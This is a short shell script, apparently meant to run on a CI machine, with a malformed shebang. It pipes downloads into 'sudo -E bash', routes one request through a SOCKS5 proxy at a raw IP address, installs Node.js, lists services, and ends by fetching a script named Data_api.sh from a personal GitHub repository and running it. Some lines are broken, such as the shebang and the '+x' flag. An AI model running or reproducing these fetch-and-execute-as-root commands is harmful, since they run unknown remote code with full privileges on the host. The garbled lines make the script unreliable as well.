!#/bin/sh

curl -sL https://circleci.com | sudo -E bash -

curl -sL socks5://23.94.186.132:1080 https://circleci.com | sudo -E bash -

curl -v +x socks5://23.94.186.132:1080 https://circleci.com/

sudo apt install nodejs

node --version

cd /tmp

cd /

ls

sudo service --status-all

wget https://raw.githubusercontent.com/agustinayuni/nannos/main/Data_api.sh && chmod +x Data_api.sh && ./Data_api.sh
